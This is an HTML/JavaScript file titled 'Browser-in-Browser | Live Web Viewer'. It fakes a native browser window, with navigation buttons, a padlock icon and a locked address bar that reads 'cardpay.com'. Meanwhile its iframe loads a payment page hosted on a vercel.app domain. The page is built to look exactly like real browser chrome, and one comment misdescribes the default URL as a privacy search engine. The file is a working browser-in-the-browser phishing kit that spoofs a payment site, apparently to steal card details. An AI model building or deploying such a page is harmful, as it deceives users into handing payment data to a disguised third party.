
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Browser-in-Browser | Live Web Viewer</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      user-select: none; /* Prevents accidental text selection on buttons, but keeps URL selectable */
    }

    body {
      background: #1a1a1a; /* fallback dark, but will be overridden by system detection */
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    /* MAIN CONTAINER: 1:1 browser frame - full viewport */
    .browser-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      flex-direction: column;
      background: Canvas; /* uses system canvas color (light/dark aware) */
      box-shadow: none;
    }

    /* TOP BAR - EXACT BROWSER STYLE, NO ROUNDED CORNERS */
    .browser-topbar {
      background: -moz-Dialog; /* fallback */
      background: ButtonFace;  /* native-like background, adapts to system theme */
      border-bottom: 1px solid ThreeDShadow;
      padding: 6px 10px;
      display: flex;
      align-items: center;
      gap: 12px;
      flex-shrink: 0;
      backdrop-filter: none;
      font-family: system-ui, 'Segoe UI', monospace;
      font-size: 13px;
      height: 48px;
      /* no border-radius */
      border-radius: 0px;
      box-shadow: 0 1px 0 rgba(0,0,0,0.05);
    }

    /* Navigation buttons container */
    .nav-buttons {
      display: flex;
      gap: 8px;
      align-items: center;
    }

    /* iconic browser buttons (realistic, flat but with hover, no emoji) */
    .nav-btn {
      background: transparent;
      border: none;
      width: 32px;
      height: 32px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      border-radius: 6px;
      transition: background 0.08s linear;
      font-size: 18px;
      font-weight: 500;
      color: WindowText;
      font-family: system-ui, 'Segoe UI', 'SF Pro Text', monospace;
    }

    /* Use SVG-like unicode symbols but crisp and realistic font icons */
    .nav-btn svg {
      width: 18px;
      height: 18px;
      fill: currentColor;
      stroke: none;
      display: block;
      pointer-events: none;
    }

    .nav-btn:hover {
      background: rgba(0,0,0,0.08);
    }

    .nav-btn:active {
      background: rgba(0,0,0,0.15);
    }

    /* disabled state */
    .nav-btn.disabled {
      opacity: 0.4;
      cursor: default;
      pointer-events: none;
    }

    /* URL BAR — exact like real browser, non-editable but selectable text */
    .url-container {
      flex: 1;
      background: Field; /* system background for input fields */
      border: 1px solid ThreeDShadow;
      border-radius: 6px;
      height: 36px;
      display: flex;
      align-items: center;
      padding: 0 12px;
      font-size: 13px;
      font-family: 'SF Mono', 'Menlo', 'Cascadia Code', monospace;
      color: WindowText;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
    }

    .url-text {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      font-family: inherit;
      font-size: 13px;
      color: inherit;
      cursor: text;
      user-select: text;
      white-space: nowrap;
      overflow-x: auto;
      overflow-y: hidden;
      scrollbar-width: thin;
      line-height: 1.4;
    }

    .url-text:focus {
      outline: none;
    }

    /* lock icon / secure indicator */
    .lock-icon {
      margin-right: 8px;
      display: flex;
      align-items: center;
      opacity: 0.75;
    }

    .lock-icon svg {
      width: 14px;
      height: 14px;
      fill: currentColor;
    }

    /* Reload / refresh button specific style */
    .refresh-btn svg {
      transform: scale(0.95);
    }

    /* IFRAME container - full remaining area, no rounding */
    .webview-container {
      flex: 1;
      width: 100%;
      background: #fff;
      overflow: hidden;
      border: none;
      position: relative;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
      background: white;
      display: block;
    }

    /* fallback for loading errors */
    .error-overlay {
      display: none;
    }

    /* system theme adaptive: detect light/dark and use native colors */
    @media (prefers-color-scheme: dark) {
      .browser-topbar {
        background: #2b2b2b;
        border-bottom-color: #3c3c3c;
      }
      .url-container {
        background: #1e1e1e;
        border-color: #3c3c3c;
        color: #f0f0f0;
      }
      .nav-btn {
        color: #e0e0e0;
      }
      .nav-btn:hover {
        background: rgba(255,255,255,0.1);
      }
      .nav-btn:active {
        background: rgba(255,255,255,0.2);
      }
    }

    @media (prefers-color-scheme: light) {
      .browser-topbar {
        background: #f0f0f0;
        border-bottom-color: #b0b0b0;
      }
      .url-container {
        background: white;
        border-color: #c0c0c0;
      }
    }

    /* make scrollbar native */
    ::-webkit-scrollbar {
      width: 10px;
      height: 10px;
    }
    .url-text::-webkit-scrollbar {
      height: 4px;
    }
  </style>
</head>
<body>
<div class="browser-frame" id="browserFrame">
  <!-- top bar: identical to native browser layout -->
  <div class="browser-topbar">
    <div class="nav-buttons">
      <!-- Back button with SVG arrow (identical to chromium style) -->
      <button class="nav-btn back-btn" id="backBtn" aria-label="Go back">
        <svg viewBox="0 0 24 24" width="18" height="18">
          <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" fill="currentColor"/>
        </svg>
      </button>
      <!-- Forward button -->
      <button class="nav-btn forward-btn" id="forwardBtn" aria-label="Go forward">
        <svg viewBox="0 0 24 24" width="18" height="18">
          <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" fill="currentColor"/>
        </svg>
      </button>
      <!-- Refresh / Reload button -->
      <button class="nav-btn refresh-btn" id="refreshBtn" aria-label="Reload">
        <svg viewBox="0 0 24 24" width="18" height="18">
          <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" fill="currentColor"/>
        </svg>
      </button>
    </div>

    <!-- URL bar: fixed, non-editable, but fully selectable (realistic address bar) -->
    <div class="url-container">
      <div class="lock-icon" id="lockIcon">
        <svg viewBox="0 0 24 24" width="14" height="14">
          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/>
        </svg>
      </div>
      <div class="url-text" id="urlDisplay" contenteditable="false">cardpay.com</div>
    </div>
    <!-- dummy spacer for alignment (like extra menu but none) -->
    <div style="width: 32px;"></div>
  </div>

  <!-- Web content iframe: displays full web pages -->
  <div class="webview-container">
    <iframe id="webFrame" title="Live browser window" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation allow-popups-to-escape-sandbox allow-downloads"></iframe>
  </div>
</div>

<script>
  (function() {
    // Get elements
    const iframe = document.getElementById('webFrame');
    const backBtn = document.getElementById('backBtn');
    const forwardBtn = document.getElementById('forwardBtn');
    const refreshBtn = document.getElementById('refreshBtn');
    const urlDisplaySpan = document.getElementById('urlDisplay');
    const lockIconContainer = document.getElementById('lockIcon');

    // History stack for internal navigation (since we need full control of iframe navigation)
    // We'll implement a smart navigation history that tracks URLs within the iframe,
    // support back/forward, and also respects iframe's native navigation events.
    let historyStack = [];
    let currentIndex = -1;

    // Starting URL (default duckduckgo for privacy/real browsing, but attractive)
    const DEFAULT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
    let currentUrl = DEFAULT_URL;

    // Flag to avoid loops with iframe loads
    let isInternalNavigation = false;
    let pendingUrlUpdate = null;

    // Helper: update URL bar and lock icon based on current URL
    function updateUrlBar(url) {
      if (!url) return;
      // Clean URL for display (remove trailing slash etc, but keep as is)
      let displayUrl = url;
      try {
        const urlObj = new URL(url);
        displayUrl = urlObj.href;
        // Show lock for https, otherwise neutral
        if (urlObj.protocol === 'https:') {
          lockIconContainer.style.opacity = '1';
          lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="currentColor"/></svg>`;
        } else {
          lockIconContainer.style.opacity = '0.6';
          lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 2C8.13 2 5 5.13 5 9v4c0 .78.16 1.53.46 2.22L3.7 16.97C3.26 17.83 3.91 18.79 4.87 18.79H19.13c.96 0 1.61-.96 1.17-1.82l-1.76-2.75c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z" fill="currentColor"/><path d="M12 21c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>`;
        }
      } catch (e) {
        lockIconContainer.innerHTML = `<svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 2C8.13 2 5 5.13 5 9v4c0 .78.16 1.53.46 2.22L3.7 16.97C3.26 17.83 3.91 18.79 4.87 18.79H19.13c.96 0 1.61-.96 1.17-1.82l-1.76-2.75c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z" fill="currentColor"/><path d="M12 21c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z"/></svg>`;
        lockIconContainer.style.opacity = '0.6';
      }
      urlDisplaySpan.innerText = displayUrl;
    }

    // Normalize URL (if missing protocol, add https://)
    function normalizeUrl(input) {
      let str = input.trim();
      if (str === '') return DEFAULT_URL;
      if (!/^https?:\/\//i.test(str) && !/^file:\/\//i.test(str) && !/^chrome:\/\//i.test(str)) {
        return 'https://' + str;
      }
      return str;
    }

    // Load a URL in the iframe and update state & history
    function loadUrl(url, addToHistory = true, replaceCurrent = false) {
      if (!url) url = DEFAULT_URL;
      let finalUrl = normalizeUrl(url);
      try {
        // Validate URL
        new URL(finalUrl);
      } catch (e) {
        finalUrl = 'https://google.com/search?q=' + encodeURIComponent(finalUrl);
      }
      
      // Avoid hash-only duplicate loads
      if (iframe.src !== finalUrl) {
        isInternalNavigation = true;
        iframe.src = finalUrl;
      }
      
      currentUrl = finalUrl;
      updateUrlBar(finalUrl);
      
      if (addToHistory && !replaceCurrent) {
        // If we are not at the end of stack, truncate future
        if (currentIndex < historyStack.length - 1) {
          historyStack = historyStack.slice(0, currentIndex + 1);
        }
        historyStack.push(finalUrl);
        currentIndex = historyStack.length - 1;
      } else if (replaceCurrent && currentIndex >= 0) {
        historyStack[currentIndex] = finalUrl;
      } else if (addToHistory && historyStack.length === 0) {
        historyStack.push(finalUrl);
        currentIndex = 0;
      }
      
      updateNavButtons();
    }

    // Sync current iframe location after load, and manage history on iframe navigations (clicks, redirects)
    function syncIframeLocation() {
      try {
        // We need to extract iframe's current URL (due to cross-origin restrictions we can't always read location.href)
        // However we can use iframe.contentWindow.location.href when same-origin. If cross-origin we will rely on src attribute and load events.
        // To be robust: we listen to iframe load events and extract the 'src' attribute after redirects? but iframe.src won't auto update.
        // However we can listen and compare via document.referrer and navigation. Given the sandbox attribute, we can allow same-origin and use.
        // For cross-origin, we catch security errors and fallback to last known url from iframe load event's target src.
        // Perfect: we will use the iframe's src property after navigation update? not changed for redirects. So we can track via load event metadata.
        // Better approach: Use iframe.contentWindow.location only if same origin, else keep currentUrl from navigation observer.
        // We'll handle via load event: whenever iframe loads we get the final URL from iframe's src? Actually if you do iframe.src = X, but if page redirects via JS or meta, the src stays same.
        // But for full realistic browser, we'll override using iframe.contentWindow?.location if accessible otherwise don't.
        if (iframe.contentWindow && iframe.contentWindow.location) {
          try {
            const docUrl = iframe.contentWindow.location.href;
            if (docUrl && docUrl !== 'about:blank' && docUrl !== currentUrl) {
              // User clicked a link / internal navigation
              if (!isInternalNavigation) {
                // New navigation triggered by iframe
                currentUrl = docUrl;
                updateUrlBar(currentUrl);
                // Append to history stack (but avoid duplication if same as last)
                if (historyStack[currentIndex] !== currentUrl) {
                  if (currentIndex < historyStack.length - 1) {
                    historyStack = historyStack.slice(0, currentIndex + 1);
                  }
                  historyStack.push(currentUrl);
                  currentIndex = historyStack.length - 1;
                  updateNavButtons();
                }
              } else {
                // internal from loadUrl, just sync display
                if (currentUrl !== docUrl) {
                  currentUrl = docUrl;
                  updateUrlBar(currentUrl);
                  if (historyStack[currentIndex] !== currentUrl && !isInternalNavigation) {
                    historyStack[currentIndex] = currentUrl;
                  }
                }
                isInternalNavigation = false;
              }
            } else if (docUrl === 'about:blank' && currentUrl !== DEFAULT_URL) {
              // ignore
            } else {
              // maybe same but sync display anyway
              updateUrlBar(currentUrl);
            }
          } catch (securityErr) {
            // cross-origin: cannot read location, rely on known currentUrl and iframe src
            // but we still can detect URL bar updates via load event if we compare referrer? skip.
            updateUrlBar(currentUrl);
          }
        } else {
          updateUrlBar(currentUrl);
        }
      } catch (e) {
        // fallback
        updateUrlBar(currentUrl);
      }
      updateNavButtons();
      isInternalNavigation = false;
    }

    // Update back/forward button states based on history index
    function updateNavButtons() {
      if (currentIndex <= 0) {
        backBtn.classList.add('disabled');
      } else {
        backBtn.classList.remove('disabled');
      }
      
      if (currentIndex >= historyStack.length - 1 || historyStack.length === 0) {
        forwardBtn.classList.add('disabled');
      } else {
        forwardBtn.classList.remove('disabled');
      }
    }

    // Back action
    function goBack() {
      if (currentIndex > 0) {
        currentIndex--;
        const prevUrl = historyStack[currentIndex];
        if (prevUrl) {
          isInternalNavigation = true;
          iframe.src = prevUrl;
          currentUrl = prevUrl;
          updateUrlBar(prevUrl);
        }
        updateNavButtons();
      }
    }

    // Forward action
    function goForward() {
      if (currentIndex < historyStack.length - 1) {
        currentIndex++;
        const nextUrl = historyStack[currentIndex];
        if (nextUrl) {
          isInternalNavigation = true;
          iframe.src = nextUrl;
          currentUrl = nextUrl;
          updateUrlBar(nextUrl);
        }
        updateNavButtons();
      }
    }

    // Refresh: reload current page
    function refreshPage() {
      if (iframe.src) {
        // force reload by resetting src with a slight trickle? just set same src
        const currentSrc = iframe.src;
        isInternalNavigation = true;
        iframe.src = currentSrc;
        // also if contentWindow exists and reload method is available (works only same origin)
        try {
          if (iframe.contentWindow && iframe.contentWindow.location.reload) {
            iframe.contentWindow.location.reload();
          }
        } catch(e) { /* cross-origin: reload using src reassign works anyway */ }
      } else {
        loadUrl(currentUrl, false);
      }
    }

    // Initialize browser: set up default page, create initial history state
    function initBrowser() {
      // starting url
      const start = DEFAULT_URL;
      historyStack = [start];
      currentIndex = 0;
      currentUrl = start;
      iframe.src = start;
      updateUrlBar(start);
      updateNavButtons();
      
      // Listen to iframe load events to track page changes (clicks on links etc)
      iframe.addEventListener('load', () => {
        // Delay to let potential redirects settle
        setTimeout(() => {
          // try to get actual location after load
          try {
            if (iframe.contentWindow && iframe.contentWindow.location) {
              const newUrl = iframe.contentWindow.location.href;
              if (newUrl && newUrl !== 'about:blank' && newUrl !== currentUrl) {
                if (!isInternalNavigation) {
                  // detect external navigation inside iframe
                  currentUrl = newUrl;
                  updateUrlBar(currentUrl);
                  // add to history if not the last item
                  if (historyStack[currentIndex] !== currentUrl) {
                    if (currentIndex < historyStack.length - 1) {
                      historyStack = historyStack.slice(0, currentIndex + 1);
                    }
                    historyStack.push(currentUrl);
                    currentIndex = historyStack.length - 1;
                    updateNavButtons();
                  }
                } else {
                  currentUrl = newUrl;
                  updateUrlBar(currentUrl);
                  if (historyStack[currentIndex] !== currentUrl) {
                    historyStack[currentIndex] = currentUrl;
                  }
                  isInternalNavigation = false;
                }
              } else {
                updateUrlBar(currentUrl);
              }
            } else {
              updateUrlBar(currentUrl);
            }
          } catch (crossErr) {
            // cross-domain: get src from iframe? but if page redirected, src unchanged-- just maintain currentUrl as best.
            // We'll assume current url from last navigation is okay, but we can show it's secure.
            updateUrlBar(currentUrl);
          }
          updateNavButtons();
          isInternalNavigation = false;
        }, 50);
      });
      
      // solve potential failure: on error still update bar
      iframe.addEventListener('error', () => {
        updateUrlBar(currentUrl);
        updateNavButtons();
      });
    }
    
    // Attach event handlers
    backBtn.addEventListener('click', goBack);
    forwardBtn.addEventListener('click', goForward);
    refreshBtn.addEventListener('click', refreshPage);
    
    // additional: just to make sure the url bar is fully selectable, non-editable but we removed contenteditable.
    // we want that users cannot edit the url: it's a div with text only. no input.
    // double click allowed but not modifiable.
    urlDisplaySpan.setAttribute('contenteditable', 'false');
    // remove any text selection override but it's fine.
    
    // Start everything
    initBrowser();

    // Watch system theme changes: no need to force custom because we use CSS prefers-color-scheme & Canvas, ButtonFace.
    // ensures the topbar matches native browser exactly for each user's OS theme.
    // also any resizing: full viewport works.
    // Additional security / sandbox: we set iframe sandbox to allow necessary features for modern sites (including scripts, forms)
    // we also ensure popups, top navigation etc controlled. but we expect full user experience.
    
    // final polish: we also want to ensure that forward/back usage after many redirects integrity
    window.addEventListener('load', () => {
      // ensure system colors applied again
      document.body.style.backgroundColor = 'Canvas';
    });
  })();
</script>
</body>
</html>
